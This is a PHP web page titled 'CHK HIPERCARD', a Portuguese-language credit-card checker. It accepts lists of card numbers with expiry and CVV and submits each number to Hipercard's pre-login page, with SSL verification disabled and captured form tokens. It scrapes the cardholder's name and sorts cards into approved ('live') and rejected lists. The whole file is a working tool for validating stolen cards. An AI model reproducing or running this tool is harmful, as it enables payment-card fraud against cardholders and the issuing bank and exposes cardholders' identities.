<?php  
require '../check.php';

?>
<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="utf-8" />

    <title>CHK HIPERCARD</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/darkly/bootstrap.min.css" rel="stylesheet" integrity="sha384-S7YMK1xjUjSpEnF4P8hPUcgjXYLZKK3fQW1j5ObLSl787II9p8RO9XUGehRmKsxd" crossorigin="anonymous">
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" />
    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  </head>
          <style>
         .panel-heading{
         	 background-color: #181818;
         }

            body {
                background-color: #181818;
                color: white;
                font-family: 'Roboto', sans-serif;
            }
            .skerda{
                text-align: left;
                margin-left: 50px;
            }
            .panel{
                background-color: #181818;

            }






       
        </style>
  <body>
    <center>
      <script type="text/javascript">
        $('#myTab a').click(function (e) {
        e.preventDefault()
        $(this).tab('show')
        })
      </script>
      <br>
      <br>
        <h3 class="panel-title"><font size="20" face="Segoe Print">Checker HYPERCARD</font size><br><br><font face="Segoe Print">PainelCheckers©</h3>
      </div>
      <div class="panel-body">
        <form method="post">
          <textarea name="list" class="form-control text-center text-warning" style="width:100%;text-align:center;color:black;" cols="90" rows="10" placeholder="Lista de cartões no formato: 4108637791xxxxxx|xx|xxxx|xxx Ou 4108637791xxxxxx|xx|xx|xxx" ></textarea>
          <br>
          <input type="submit" onclick="start()" class="btn btn-success" value="Começar Teste" name="x" />
          <br>
          </center>
          <ul class="nav nav-tabs" role="tablist">
            <li class="nav-item">
			<li class="nav-item" style="width:20%;">
              <a class="nav-link text-success" data-toggle="tab" href="#lives" role="tab">Aprovadas ✔</a>
            </li>

            <li class="nav-item">
			<li class="nav-item" style="width:20%;">
              <a class="nav-link text-danger" data-toggle="tab" href="#dies" role="tab">Reprovadas ✘</a>
            </li>
			
			<li class="nav-item">
			<li class="nav-item" style="width:20%;">
              <a class="nav-link text-danger" data-toggle="tab" href="#reteste" role="tab">Erros ✘</a>
            </li>
          </ul>
          <div class="tab-content">
            <div class="tab-pane" id="lives" role="tabpanel">
              <div id="ccs_live"></div>
            </div>
            <div class="tab-pane" id="dies" role="tabpanel">
              <div id="ccs_die"></div>
            </div>
			<div class="tab-pane" id="reteste" role="tabpanel">
              <div id="ccs_reteste"></div>
            </div>
          </div>
          <br>
        </form>
      </div>
</body>
</html>
<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


if (isset($_POST['x'])) {
    $list = explode("\r\n", $_POST['list']);
    foreach ($list as $value) { 
    flush();
    ob_implicit_flush(true);
    list($cc, $mes, $ano, $cvv) = explode("|", $value);
    $cc  = trim($cc);
    $mes = trim($mes);
    $ano = trim($ano);
    $cvv = trim($cvv);

    #Função para Consultar a BIN

    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
    
    #Termina Aqui.

	  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.hipercard.com.br/bi5/Paginas/Cartao/PreLogin.aspx?pc=');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '__MUQ6MQpF2rseStLGgT%2FvGnTkZvu3V0PpUHOD%2FC%2FfNwKwIJ00R7%2BZSlsFvn4RLLTgqAoxpW%2FWktn6dTG6LRVhuw%3D%3D=ml1tjpwq85uQCUwQT6playkftS1bgJ0WqEBsXSkA%2FXyayzV9BREGUsRVAiG2HHW1JLynXmhnr12g%2FyxFHEbj8KtjkCfHNocaPrYdPiFU%2F4hFJxiKPlhR3P4VOooUbq8fB%2BSxTZCHp7exclH2IKU0zUexDmLfgCC5wW%2Fcoiafthi4MWvjpLUaZDv4wzoIaFS5fKmTIjMxecutH0R%2FpmT%2FujTqZsKZTko4bG1%2BFnmI%2BZorXyvKDP8ClVXwbF7yetOMoQVaVdUekh1xsql9vV%2FDBkzw%2F8iKqq2dUMiObzqX4HBrXBgcggmDvzkb5N1Wl7%2BaAcSZ8IzUmk5AwRC1IrfM58lHMKGR7VEDEc%2B4WOdzRjGefKuxh6ocYTKX6HAR3hHqYOqY%2BGYrllDtwY92%2FfxPkFrywSC2%2BBFMniKk3RLb5PvP8XTmwV5kP%2FEWf%2FL1Yc0a5YLyy%2Fu19JXMY1GQiSbYfhBhJbjGJFpJsT1HKfDtNznNCJ9WFT1k5nQUnmpyXAJRtdWzR5YY%2F4SLxuiSLoNh%2FA2rxrfALLiikz8XOgHbioPJNDVZKf9kjtb1eKUlVWWAdvrFkjKtsc9Wk7%2FyVA%2Fy9z3iarisMFoHqDG4SGZCm3wMjkAXEpFyPAOQRnOza0MH%2BjBMVCXfRCxik9uGtl7NebpKXajrqN8kZLs2FYtaCJby%2FOvBZgM0ayALs0nFkENuKr%2FcpvO3eY0Tp3FelGo44T7AAo6PtcPSr747UkD7PcVanLZVZXAGzHKTa0Amj21cU0WQ6ZX9ZBRDskPrm0AJMP0sfE70eYfDfIW%2FJVVenpOZyF8bVpVNDWPbDU68tuOh8dzjLv3lIlpQhnDbeX%2B5%2BtOr4Sh2prQhRA7liPtIjxU%2FnMpEdzn9ZaKM7MA5F2kKXPPVQixqFTxQ0zRqlMhreaPFsARjmySHTX3yPu1gnupz2vvfC2PCrcr4klSEDcsGSxrcsq7c122F3JwNuHpXIcWPfUB5iqFpa1SW%2FBlZxhGgrdPduC7y2pLDdbmZYPyD66MtqdvGMjQwwpAAUCQ%2BWg8y3t0VnAkJgPC8dGKtbKUJ5oTy1yCu9FPHtbystFm5wrjMu3wfTXSVfazfPIqOHKh8qgtG5udeVKOaaTKECufeWgigDxFFrMe0KlMr4jvGSnvKRihOULxniBDITId317ggN4q0TLeEYP7cZ6H90rNW%2BpLCP7oVcIh5kpf7XMjJGEpv7dZ4MZ%2BZANprP0XEXg9BW0h8WH8PEuzAuU9rMaG2pbeZ0C9cPGX2H8mnt%2FssxRRlMRYgwNNHGlaHrg29gjLiAeqIEutPgisbbUZafz3rsUbpGkfxHwduCXSlOWOV7P4jHi8dcWQgRqnLu7jH7pg9YcbxgyRWL4sk3BrNY%2BVf3EGXt8NFTSv%2F1Q9sOk6ChSPGYU%2Fgh2WTxtiUGYZ%2F0OMemwcw1fQQ2WAgaHKVRtSvG01icSE%2BiCK5KpSvTpKjlhZrXXTHMEYs6xMRkDq9n5%2Brz2O1JLqId3iLV%2FNfD5LzPc3XJGYAVNQNTNz8pchtsQ78Fuiv4l%2BjQcH7DngB8gvmZy7X4CD275853xW2OkUvm%2BV49wUdfYlmHwf6rNarCPNPg79iPhwDQqeRwGgjsj5jJgjM5HA2u6I9ah785fcWt%2FkfUGfRj%2Bra9Tp%2FMqCVlSArGCKjanBoLv21aHzZbKN%2FTAmAtkK7lHC9XfKxBXRpQY6d%2BHz2n1OqcI%2FZwgvb3gfCbB%2FdJZCB1%2BVJOVM1PZT0WG12U5bsmnUPwHYnGxj6BzMwxyNEq4ieMZHN6uc7sGojvGnxA4iBfyCJtjKlRFaCgX%2BzQ5WrKX8NtCmKStQv6ZJLKJky6IvOxEwYF7hCI7b8zFUkx%2BAQuPvawDlRJwE1iHv6I2%2B%2BM5GHRoy1H6C0aoj5nP9YLY7yZH3GvAcikQjiqy4cTyXLCKQyJeavMoANbpZC5ciCvjPzWxyuZfa1ZyaIM4TiH1DVtuyC3CFdazGh9oFeZNGVsrqHpDtpPOIsA2L4oeJf5Ufw3syYl8pY8mLi8Edqgh9%2FNjkzcNR0u9AxAgZRi7akKL0AdSjtshI8LrVSKbxgQMDzEtrSyTUqOfq08%2FRx5e2u8qryLi7tviNDiXL2p5nnNBUimCfDU987PZawaJxad%2Fl6nEhsJ8OJ7hg4ORAo2ksFIBU%2BjIie3AkzRHUCPUQrP6kvpTirI90vCTi%2FJ7%2FAIzqtj8q%2FnEGdcduF8dfoJgGp%2BgQhXnEToGMCkHK%2FJACew46t3p6%2FSdnCIG3vG2B3ZtCvrl4%2Bnja2ELI7xFHNTLAIw3TsA0q89QJofkURV21apsQ0auEw0GZFe0%2FU9KAA3dEQgo7KaHhp6t92TCjYsKTTPtEH%2BsYs4j1ea1J13geNDNJHCaPy93GE6FFo1VhPBTOd6PCI0C8BLGanpJDbo0LquGZILKn0ZE4Wtlp0bhJkXTseV38EwfiMVFMLxySSOFM6phcSoJJ1%2F2oEjjZgKbNA4WvmmTX1B6Xqoa5ka%2FQaY2RBstwz8km3Navt0rOWYMs2vqcHRETKsaVU1KDEJcB8g4oHplEb69dMYqxloXGsTJtosBEr1AmpW3Z5gqFewTSGLX1gqyWiJApBCV5eQPz4C7x1gW9buV48LABYsdtA28o3ZfxkKKVtHgFNsBS0Wzxi7UDXs6QU93KPU%2F4Ir2NbHa7gC6YocD7R5LA9wl1SNnnJsDOiLaR4pJi3o47mjMMQKsfsEXEzVxG1iDWv6VtK0gGCOq4r7ddNOGpiOBgsxVTIb0mwDGEFkk%2FCFSeH8LXFMaUrY8g%3D&__zeYfMzrOwrfeVs80OcfjhA3tpBRbxy%2F6S6HOmPcWgYPjAhIiKn6oMzaUsK5qDvvk4Q1pfQdPyMGV9y009qgKOA%3D%3D=d6rRWGv6W7SDhJEM9zqCHFn8obqTN%2FlZAsAozK%2FrRTJ0gUKWKg%2FcZjtGj82sYtbkHL1y1SNgKIgfkXPFWrlfAw%3D%3D&__L%2BNKyOHw46e%2BYwr4eAGwZ9pjUyNonmaNuybw9HJluk2bRljhymbrEszsIlgjQ6ga1THJfOOLLwUjX15ThetUfA%3D%3D=M%2BcB%2F8rs6Qj75%2Br5ktjt53OyGjL%2BMLYkfx46aTlsH4%2FQhGTtIRM3VeYFpMbhkxJQ%2BClyKMzp3Slgw1TjUFEiJw%3D%3D&__VIEWSTATE=&ctl00%24BUSCA=&ctl00%24NAVEGADOR=&ctl00%24SESSAO=FALSE&numCartao='.$cc.'&ctl00%24aspnetConteudo%24CARTAO='.$cc.'');
$pagamento = curl_exec($ch);
curl_close($ch);

$nome = GetStr($pagamento, '<a class="LinkTecaldo" href="javascript:ObterTeclado();">','</a>');


if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if (strpos($pagamento, 'Se o seu nome não estiver correto')) {

echo '<script>$("#ccs_live").prepend("Aprovada ✔ '.$value.' | Informações [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | País: '.$pais.' ('.$paiscode.') ] Retorno: Transação autorizada | Dono do cartão: '.$nome.' | <br>");</script>';
  
}elseif (strpos($pagamento, 'Acesso não permitido')) {
    
  echo '<script>$("#ccs_die").prepend("Reprovada ✘ '.$value.' | Informações [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | País: '.$pais.' ('.$paiscode.') ] Retorno: Houve um erro ao processar o pagamento! | <br>");</script>';
  
}elseif (strpos($pagamento, 'Cartão inválido.')) {
    
  echo '<script>$("#ccs_die").prepend("Reprovada ✘ '.$value.' | Informações [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | País: '.$pais.' ('.$paiscode.') ] Retorno: Transação não foi autorizada! | <br>");</script>';
 
 }elseif (strpos($pagamento, 'Acesso negado')) {
    
  echo '<script>$("#ccs_die").prepend("Reprovada ✘ '.$value.' | Informações [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | País: '.$pais.' ('.$paiscode.') ] Retorno: Transação não foi autorizada! | <br>");</script>';
   
  
  }else{

  echo '<script>$("#ccs_reteste").prepend("Erro ✘ '.$value.' | Informações [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | País: '.$pais.' ('.$paiscode.') ] Retorno: ERRO ADMINISTRADOR| <br>");</script>';
}
}
//echo $pagamento;
}
ob_flush();
?>